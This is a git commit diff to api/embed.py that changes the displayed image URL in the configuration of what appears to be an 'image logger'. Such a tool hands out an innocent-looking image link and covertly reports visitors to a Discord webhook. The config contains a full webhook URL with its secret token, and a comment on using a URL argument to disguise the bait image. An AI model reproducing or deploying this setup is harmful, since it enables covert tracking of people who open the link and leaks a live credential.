0e462b353b35a577a0aa2c1de9dc8c8edc73ef0e
ppg63275-ai <ppg63275@gmail.com>
2025-09-07 23:09:29 +0700

    Update embed.py

--- api/embed.py
+++ api/embed.py
@@ -10,7 +10,7 @@ author = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1413132864744063027/l9Ek19EIiip8QDSLPSe79rcQa5pS4pz5OwuVHtxp3dzA738AlEJyeLJj4H-HssV-N3Lg",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNQsXJYCiYsqKTdJei_KuhZHGMPQ7nudCddeFAGJ7hQHa-e9WniZOSd2s&s=10", # You can also have a custom image by using a URL argument
+    "image": "https://i.imgur.com/hZ8dfSC.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
